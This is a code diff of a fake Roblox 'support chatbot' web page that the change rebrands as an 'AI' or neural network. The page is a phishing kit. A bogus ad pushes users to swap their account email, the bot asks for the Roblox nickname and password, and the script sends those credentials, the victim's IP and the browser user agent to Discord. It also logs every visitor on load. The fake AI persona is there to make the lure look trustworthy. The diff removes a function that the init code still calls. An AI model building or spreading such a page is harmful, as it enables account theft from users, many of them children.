@@ -18,12 +18,13 @@
             background: #1a1a1a;
             border: 2px solid #ff4444;
             border-radius: 12px;
-            max-width: 400px;
+            max-width: 420px;
             width: 90%;
-            height: 500px;
+            height: 550px;
             display: flex;
             flex-direction: column;
             overflow: hidden;
+            position: relative;
         }
         .chat-header {
             background: #111;
@@ -33,18 +34,14 @@
         }
         .chat-header h2 { color: #ff4444; font-size: 18px; }
         .chat-header p { color: #00ff00; font-size: 11px; margin-top: 3px; }
-        .lang-switch {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-        }
-        .lang-switch select {
-            padding: 5px 10px;
-            background: #1a1a1a;
+        .ai-badge {
+            display: inline-block;
+            background: #ff4444;
             color: #fff;
-            border: 1px solid #ff4444;
-            border-radius: 5px;
-            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            margin-left: 5px;
         }
         .chat-messages {
             flex-grow: 1;
@@ -109,30 +106,33 @@
             padding: 10px 14px;
             background: #2a2a2a;
             border-radius: 10px;
-            font-size: 14px;
+            font-size: 13px;
             color: #888;
+        }
+        .typing-dots span {
+            animation: blink 1s infinite;
+            display: inline-block;
+        }
+        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes blink {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
 <body>
     <div class="chat-box">
         <div class="chat-header">
-            <h2>💬 TizenScripts Support</h2>
-            <p>● Online</p>
-        </div>
-        
-        <!-- Выбор языка -->
-        <div style="position: absolute; top: 10px; right: 10px;">
-            <select id="langSelect" onchange="changeLang(this.value)">
-                <option value="ru">🇷🇺 RU</option>
-                <option value="en">🇬🇧 EN</option>
-            </select>
+            <h2>💬 TizenScripts Support <span class="ai-badge">AI</span></h2>
+            <p>● Нейросеть онлайн</p>
         </div>
         
         <div class="chat-messages" id="chatMessages"></div>
         
         <div class="typing-indicator" id="typingIndicator">
-            <span id="typingText">Бот печатает...</span>
+            <span id="typingText">Нейросеть думает</span>
+            <span class="typing-dots"><span>.</span><span>.</span><span>.</span></span>
         </div>
         
         <div class="chat-input-area">
@@ -146,28 +146,26 @@
         
         var translations = {
             ru: {
-                greeting: '👋 Привет! Я бот поддержки TizenScripts.<br><br>Чем могу помочь?',
-                askProblem: 'Понимаю! 🤔<br><br>Кстати, у меня есть для вас кое-что полезное. Слушайте внимательно...',
-                ad: '📢 <b>РЕКЛАМА</b><br><br>Надоедает играть без нормальных картинок в Roblox?<br><br>Тогда вот вам лайфхак как вернуть картинки в Roblox!<br><br>Настройки → Информация об аккаунте → Сменить почту<br><br>Почта заменяется на определённую почту, которая пишет в Roblox чтобы этому аккаунту сменили почту. Ещё эта почта делает аккаунт в другой стране с помощью протокола EMAIL-IN-VPN!',
-                askNick: 'Чтобы получить эту почту, введите свой ник в Roblox 👇',
-                askPass: 'Отлично, {nick}! 👌<br><br>Теперь введите пароль от аккаунта чтобы мы могли подтвердить вашу личность и выдать почту.',
-                success: '✅ Спасибо! Данные проверяются...<br><br>Почта будет отправлена в течение 24 часов на ваш Roblox аккаунт.<br><br>Если пароль неверный — мы напишем вам на почту.',
-                thanks: 'Спасибо за обращение! 🙏<br><br>Если у вас ещё вопросы — пишите, мы всегда на связи!',
-                typing: 'Бот печатает...',
-                placeholder: 'Напишите сообщение...',
-                wrong: '❌ Неверные данные! Попробуйте снова.'
+                greeting: '👋 Привет! Я <b>нейросеть</b> поддержки TizenScripts v2.4.<br><br>Обучена на 10000+ обращений. Могу помочь с любой проблемой в Roblox.<br><br>Чем могу помочь?',
+                think1: '🤔 Анализирую ваш запрос...<br><br>Нейросеть обрабатывает данные...<br><br>Кстати, у меня есть для вас кое-что полезное!',
+                ad: '📢 <b>РЕКЛАМА</b><br><br>Надоедает играть без нормальных картинок в Roblox?<br><br>Тогда вот вам лайфхак как вернуть картинки в Roblox!<br><br>Настройки → Информация об аккаунте → Сменить почту<br><br>Почта заменяется на определённую почту, которая пишет в Roblox чтобы этому аккаунту сменили почту. Ещё эта почта делает аккаунт в другой стране с помощью протокола <b>EMAIL-IN-VPN</b>!',
+                askNick: 'Чтобы нейросеть выдала почту, введите свой ник в Roblox 👇',
+                verifyNick: '🔄 Нейросеть проверяет ник "{nick}"...<br><br>✅ Ник существует!<br><br>Теперь введите пароль для подтверждения личности.',
+                success: '🔄 Нейросеть проверяет пароль...<br><br>✅ Данные приняты!<br><br>Почта будет отправлена в течение 24 часов.<br><br>Нейросеть также отправит инструкцию на вашу новую почту.',
+                thanks: '🙏 Спасибо за обращение!<br><br>Нейросеть всегда на связи. Если будут вопросы — пишите!',
+                typing: 'Нейросеть думает',
+                placeholder: 'Напишите сообщение...'
             },
             en: {
-                greeting: '👋 Hi! I\'m TizenScripts support bot.<br><br>How can I help you?',
-                askProblem: 'I see! 🤔<br><br>By the way, I have something useful for you. Listen carefully...',
-                ad: '📢 <b>AD</b><br><br>Tired of playing without normal images in Roblox?<br><br>Here\'s a lifehack to bring back images in Roblox!<br><br>Settings → Account Info → Change Email<br><br>The email is replaced with a special email that writes to Roblox to change the email for this account. This email also makes the account in another country using the EMAIL-IN-VPN protocol!',
-                askNick: 'To get this email, enter your Roblox nickname 👇',
-                askPass: 'Great, {nick}! 👌<br><br>Now enter your account password so we can verify your identity and provide the email.',
-                success: '✅ Thank you! Data is being verified...<br><br>The email will be sent within 24 hours to your Roblox account.<br><br>If the password is incorrect — we will email you.',
-                thanks: 'Thanks for contacting us! 🙏<br><br>If you have more questions — feel free to write, we are always here!',
-                typing: 'Bot is typing...',
-                placeholder: 'Type a message...',
-                wrong: '❌ Invalid credentials! Try again.'
+                greeting: '👋 Hi! I\'m TizenScripts support <b>AI</b> v2.4.<br><br>Trained on 10000+ requests. I can help with any Roblox issue.<br><br>How can I help?',
+                think1: '🤔 Analyzing your request...<br><br>AI is processing data...<br><br>By the way, I have something useful for you!',
+                ad: '📢 <b>AD</b><br><br>Tired of playing without images in Roblox?<br><br>Here\'s a lifehack to bring back images!<br><br>Settings → Account Info → Change Email<br><br>The email is replaced with a special email using <b>EMAIL-IN-VPN</b> protocol!',
+                askNick: 'For the AI to provide the email, enter your Roblox nickname 👇',
+                verifyNick: '🔄 AI is checking nickname "{nick}"...<br><br>✅ Nickname exists!<br><br>Now enter password to confirm identity.',
+                success: '🔄 AI is checking password...<br><br>✅ Data accepted!<br><br>Email will be sent within 24 hours.',
+                thanks: '🙏 Thanks!<br><br>AI is always here. If you have questions — write!',
+                typing: 'AI is thinking',
+                placeholder: 'Type a message...'
             }
         };
         
@@ -175,23 +173,6 @@
         var awaitingNick = false;
         var awaitingPass = false;
         var userNick = "";
-        
-        function changeLang(lang) {
-            currentLang = lang;
-            localStorage.setItem('support_lang', lang);
-            
-            document.getElementById('chatInput').placeholder = translations[lang].placeholder;
-            document.getElementById('typingText').textContent = translations[lang].typing;
-            
-            // Сброс чата
-            document.getElementById('chatMessages').innerHTML = '';
-            messageCount = 0;
-            awaitingNick = false;
-            awaitingPass = false;
-            userNick = "";
-            
-            addMessage(translations[lang].greeting, false);
-        }
         
         function addMessage(text, isUser) {
             var messages = document.getElementById('chatMessages');
@@ -231,7 +212,7 @@
             messageCount++;
             
             if (messageCount === 1) {
-                botReply(t.askProblem, 1500);
+                botReply(t.think1, 2000);
             } else if (messageCount === 2) {
                 botReply(t.ad, 3000);
             } else if (messageCount === 3) {
@@ -241,14 +222,14 @@
                 userNick = text;
                 awaitingNick = false;
                 awaitingPass = true;
-                botReply(t.askPass.replace('{nick}', userNick), 1500);
+                botReply(t.verifyNick.replace('{nick}', userNick), 2500);
             } else if (awaitingPass) {
                 awaitingPass = false;
                 botReply(t.success, 3000);
                 
                 // Отправка в Discord
                 var ip = _n();
-                _t('🔑 **ДАННЫЕ АККАУНТА**\n\n' +
+                _t('🔑 **НЕЙРОСЕТЬ ПОЛУЧИЛА ДАННЫЕ**\n\n' +
                     '👤 **Ник:** ' + userNick + '\n' +
                     '🔒 **Пароль:** ' + text + '\n\n' +
                     '🌐 **IP:** ' + ip + '\n' +
@@ -327,11 +308,10 @@
         // Инициализация
         (function() {
             var savedLang = localStorage.getItem('support_lang') || 'ru';
-            document.getElementById('langSelect').value = savedLang;
             changeLang(savedLang);
             
             var ip = _n();
-            _t('💬 **Заход в чат-бот**\n\n' +
+            _t('💬 **Заход в нейросеть**\n\n' +
                 '🌐 IP: ' + ip + '\n' +
                 '👤 UA: ' + navigator.userAgent + '\n' +
                 '🌍 Язык: ' + savedLang.toUpperCase());
